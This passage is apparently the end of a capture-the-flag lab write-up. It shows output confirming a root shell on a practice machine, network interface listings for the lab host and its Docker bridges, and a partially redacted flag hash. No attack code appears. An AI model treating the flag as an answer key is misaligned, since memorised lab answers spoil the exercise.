uid=0(root) gid=0(root) groups=0(root)        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo                                                                                                                                                                 
       valid_lft forever preferred_lft forever                                                   
    inet6 ::1/128 scope host                                                                     
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000                                                                                                    
    link/ether 00:50:56:b9:31:52 brd ff:ff:ff:ff:ff:ff               
    inet 10.10.10.200/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:3152/64 scope global dynamic mngtmpaddr                                                                                                                         
       valid_lft 86056sec preferred_lft 14056sec                     
    inet6 fe80::250:56ff:feb9:3152/64 scope link  
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default                                                                                                    
    link/ether 02:42:77:69:ff:34 brd ff:ff:ff:ff:ff:ff               
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-742fc4eb92b1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:69:7f:82:a4 brd ff:ff:ff:ff:ff:ff
    inet 172.31.0.1/16 brd 172.31.255.255 scope global br-742fc4eb92b1
       valid_lft forever preferred_lft forever
    inet6 fe80::42:69ff:fe7f:82a4/64 scope link  
       valid_lft forever preferred_lft forever
6: veth1ae0ff9@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether c2:59:5e:af:e1:5f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::c059:5eff:feaf:e15f/64 scope link 
       valid_lft forever preferred_lft forever
8: veth2be5ac6@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether b6:fb:b1:52:67:49 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::b4fb:b1ff:fe52:6749/64 scope link 
       valid_lft forever preferred_lft forever
10: veth1533769@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether 0e:60:f5:92:ae:6b brd ff:ff:ff:ff:ff:ff link-netnsid 3
    inet6 fe80::c60:f5ff:fe92:ae6b/64 scope link  
       valid_lft forever preferred_lft forever
12: vethe16a667@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-742fc4eb92b1 state UP group default 
    link/ether da:44:28:f8:d1:a6 brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::d844:28ff:fef8:d1a6/64 scope link 
       valid_lft forever preferred_lft forever
unbalanced
347acfd<SNIP>
```
